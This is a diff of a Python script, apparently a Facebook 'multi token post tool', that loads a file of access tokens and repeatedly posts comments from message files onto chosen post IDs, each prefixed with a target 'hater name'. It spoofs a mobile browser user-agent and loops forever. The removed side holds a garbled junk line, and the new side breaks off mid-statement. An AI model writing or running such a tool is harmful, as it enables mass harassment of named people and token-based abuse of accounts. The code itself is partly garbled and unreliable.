@@ -1,21 +1,10 @@
 import requests
-import mechanize
-import getpass
-import json
-import random
 import time
 from datetime import datetime
-from bs4 import BeautifulSoup 
 from colorama import Fore, Style
-from rich.panel import Panel
-from platform import system
-import os, platform, binascii, sys, _socket, ssl, certifi, zlib, json, uuid
-from os import system as sh
-from time import sleep
 
-os.system("xdg-open https://www.facebook.com/groups/294191408815536/?ref=share")
-time.sleep(1)
-
+# Logo and introduction
+logo = """
   /$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$ 
  /$$__  $$ /$$__  $$| $$$    /$$$| $$_____/| $$_____/| $$__  $$
 | $$  \__/| $$  \ $$| $$$$  /$$$$| $$      | $$      | $$  \ $$
@@ -35,151 +24,149 @@ time.sleep(1)
 |__/  |__/|__/     \__/|_______/                               
                                                         
 --------------------------------------------------------------  
-      WELCOME TO THE MULTI TOKEN POST TOOL
+      WELCOME TO THE MULTI TOKEN POST TOOL
 --------------------------------------------------------------                                                                                
-       THIS TOOL CREATED BY AALAM HASHMI
+       THIS TOOL CREATED BY AALAM HASHMI
 --------------------------------------------------------------  
-        MULTI IDZ MULTI PAGE WALLS MULTI FILE LOADER TOOL
+        MULTI IDZ MULTI PAGE WALLS MULTI FILE LOADER TOOL
 --------------------------------------------------------------                            
-'''
-# Print the logo
-print(Fore.CYAN + logo +  Style.RESET_ALL)
+"""
 
+# Print the logo
+print(Fore.CYAN + logo + Style.RESET_ALL)
 
 # Prompt for token file
-token_file = input("ENTER TOKEN FILE PATH : ")
-print('--------------------------------------------')
+token_file = input("ENTER TOKEN FILE PATH: ")
 
 # Read access token IDs from file
 with open(token_file, 'r') as f:
-    access_tokens = f.read().splitlines()
+    access_tokens = f.read().splitlines()
 
 # Prompt for the number of user IDs
-num_user_ids = int(input("HOW MANY POSTS YOU WANT FOR LOADER : "))
-print('--------------------------------------------')
+num_user_ids = int(input("HOW MANY POSTS YOU WANT FOR LOADER: "))
 
-# Define the user IDs and message files
+# Define dictionaries to store user IDs and message files
 user_messages = {}
-haters_name = {} 
+haters_name = {}
 
 # Prompt for user IDs and message files
 for i in range(num_user_ids):
-    user_id = input(f"ENTER POST ID #{i+1} : ")
-    print('--------------------------------------------')
-    hater_name = input(f"ENTER HATER NAME FOR POST ID {user_id} : ")
-    print('--------------------------------------------')
-    haters_name[user_id] = hater_name
-    message_file = input(f"ENTER MESSAGES FILE /NP FOR {user_id} : ")
-    print('--------------------------------------------')
-    user_messages[user_id] = message_file
-
-
-
+    user_id = input(f"ENTER POST ID #{i+1}: ")
+    hater_name = input(f"ENTER HATER NAME FOR POST ID {user_id}: ")
+    message_file = input(f"ENTER MESSAGES FILE FOR {user_id}: ")
+    user_messages[user_id] = message_file
+    haters_name[user_id] = hater_name
 
 # Prompt for delay time in messages
-delay_time = int(input("ENTER DELAY/TIME (in seconds) FOR MESSAGES : "))
-print('--------------------------------------------')
- t5t555⁵5cccccvc 5 5 5 5 54r r 5. 4c5 4 4.   
-# Prompt for delay before repeating the process
-repeat_delay = int(input("ENTER DELAY/TIME (in seconds) BEFORE REPEATING THE PROCESS : "))
-print('--------------------------------------------')
+delay_time = int(input("ENTER DELAY (in seconds) FOR MESSAGES: "))
 
-# Get profile name using an access token
+# Prompt for delay before repeating the process
+repeat_delay = int(input("ENTER DELAY (in seconds) BEFORE REPEATING THE PROCESS: "))
+
+# Function to get profile name using an access token
 def get_profile_name(access_token):
-    url = f'https://graph.facebook.com/v17.0/me?access_token={access_token}'
-    response = requests.get(url)
-    data = response.json()
-    if 'name' in data:
-        return data['name']
-    return None
+    try:
+        url = f'https://graph.facebook.com/v17.0/me?access_token={access_token}'
+        response = requests.get(url)
+        data = response.json()
+        if 'name' in data:
+            return data['name']
+        else:
+            print(f'{Fore.RED}Profile name not found for access token: {access_token}{Style.RESET_ALL}')
+            return None
+    except requests.exceptions.RequestException as e:
+        print(f'{Fore.RED}Request error: {str(e)}{Style.RESET_ALL}')
+        return None
+    except Exception as e:
+        print(f'{Fore.RED}An unexpected error occurred: {str(e)}{Style.RESET_ALL}')
+        return None
 
 # Function to send a message to a user's inbox conversation using an access token
-def send_message(access_token, user_id, message):
-    url = "https://graph.facebook.com/v15.0/{}/comments".format(user_id)
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Referer': 'https://www.facebook.com/',
-        'Authorization': f'Bearer {access_token}'
-    }
-    data = {'message': hater_name + ' ' + message}
+def send_message(access_token, user_id, hater_name, message):
+    try:
+        url = f"https://graph.facebook.com/v15.0/{user_id}/comments"
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+            'Referer': 'https://www.facebook.com/',
+            'Authorization': f'Bearer {access_token}'
+        }
+        data = {'message': hater_name + ' ' + message}
 
-    response = requests.post(url, headers=headers, data=data)
-    if response.status_code == 200:
-        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        print(f'{Fore.BLUE}[{current_time}] {Fore.YELLOW}Comment sent successfully to user ID {user_id}: {Fore.GREEN}{hater_name + message}')
-        return True
-    else:
-        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        print(f'{Fore.BLUE}[{current_time}] {Fore.RED}Error sending comment to user ID {user_id}: {Fore.RED}{hater_name + message}')
-        print(f'{Fore.RED}[{current_time}] Response content: {Fore.RED}{response.content.decode()}')
-        return False
+        response = requests.post(url, headers=headers, data=data)
+        response.raise_for_status()  # Raise HTTPError for bad responses
+
+        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        print(f'{Fore.BLUE}[{current_time}] {Fore.YELLOW}Comment sent successfully to user ID {user_id}: {Fore.GREEN}{hater_name + message}')
+        return True
+
+    except requests.exceptions.RequestException as e:
+        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        print(f'{Fore.RED}[{current_time}] {Fore.RED}Request error sending comment to user ID {user_id}: {str(e)}{Style.RESET_ALL}')
+        return False
+
+    except requests.exceptions.HTTPError as e:
+        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        print(f'{Fore.RED}[{current_time}] {Fore.RED}HTTP error sending comment to user ID {user_id}: {str(e)}{Style.RESET_ALL}')
+        return False
+
+    except Exception as e:
+        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        print(f'{Fore.RED}[{current_time}] {Fore.RED}An unexpected error occurred sending comment to user ID {user_id}: {str(e)}{Style.RESET_ALL}')
+        return False
 
 # Main loop to send messages
 while True:
-    total_successful_messages = 0
-    total_unsuccessful_messages = 0
+    total_successful_messages = 0
+    total_unsuccessful_messages = 0
 
-    # Iterate over the access tokens
-    for i, access_token in enumerate(access_tokens):
-        try:
-            # Login using the access token and get the profile name
-            profile_name = get_profile_name(access_token)
-            if not profile_name:
-                continue
+    # Iterate over the access tokens
+    for i, access_token in enumerate(access_tokens):
+        try:
+            # Login using the access token and get the profile name
+            profile_name = get_profile_name(access_token)
+            if not profile_name:
+                continue
 
-            profile_number = i + 1
-            access_token_id = access_token[:4] + '********'
+            profile_number = i + 1
+            access_token_id = access_token[:4] + '********'
 
-            # Print the profile information
-            print(f'{Fore.YELLOW}Profile {profile_number} (ID: {access_token_id}): {profile_name}')
-            print('--------------------------------------------')
+            # Print the profile information
+            print(f'{Fore.YELLOW}Profile {profile_number} (ID: {access_token_id}): {profile_name}')
+            print('--------------------------------------------')
 
-            # Iterate over the user IDs and messages
-            for user_id, message_file in user_messages.items():
-            	
-                # Read messages from the message file for the current user ID
-                with open(message_file, 'r') as f:
-                    messages = f.read().splitlines()
+            # Iterate over the user IDs and messages
+            for user_id, message_file in user_messages.items():
+                # Read messages from the message file for the current user ID
+                with open(message_file, 'r') as f:
+                    messages = f.read().splitlines()
 
-                # Shuffle the messages for the current user
-                
-                # Get the hater name for the current user ID
-                hater_name = haters_name[user_id]
+                # Get the hater name for the current user ID
+                hater_name = haters_name[user_id]
 
+                # Get the messages count for the current user
+                messages_count = len(messages)
 
-                # Get the messages count for the current user
-                messages_count = len(messages)
+                # Get the current message index for the user ID
+                message_index = i % messages_count
 
-                # Get the current message index for the user ID
-                message_index = i % messages_count
+                # Get the message for the current index
+                message = messages[message_index]
 
-                # Get the message for the current index
-                message = messages[message_index]
+                if send_message(access_token, user_id, hater_name, message):
+                    total_successful_messages += 1
+                else:
+                    total_unsuccessful_messages += 1
 
-                if send_message(access_token, user_id, message):
-                    total_successful_messages += 1
-                else:
-                    total_unsuccessful_messages+= 1
+                time.sleep(delay_time)  # Delay between each message
 
-                time.sleep(delay_time)  # Delay between each message
-            # Print Facebook ID, message, and current date/time after message is sent
-            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            print(f'{Fore.MAGENTA}Facebook ID: {user_id}')
-            print('--------------------------------------------')
-            print('Next ID Ready To Send Comment')
-            print('--------------------------------------------')
+            # Print Facebook ID, message, and current date/time after message is sent
+            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            print(f'{Fore.MAGENTA}Facebook ID: {user_id}')
+            print('--------------------------------------------')
+            print('Next ID Ready To Send Comment')
+            print('--------------------------------------------')
 
-        except requests.exceptions.RequestException as e:
-            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            print(f'{Fore.RED}[{current_time}] Internet disconnected. Reconnecting in 10 seconds...{Style.RESET_ALL}')
-            time.sleep(10)
-
-        except Exception as e:
-            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            print(f'{Fore.RED}[{current_time}] An error occurred: {str(e)}{Style.RESET_ALL}')
-            continue
-
-    print('--------------------------------------------')
-    print('All comments sent. Waiting before repeating the process...')
-    print('--------------------------------------------')
-    time.sleep(delay_time)  # Delay before repeating the process
+        except requests.exceptions.RequestException as e:
+            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            print(f'{Fore.RED}[{current_time}] Internet disconnected. Reconnecting in 10 seconds...{Style.RESET_ALL}')
+            time.sleep
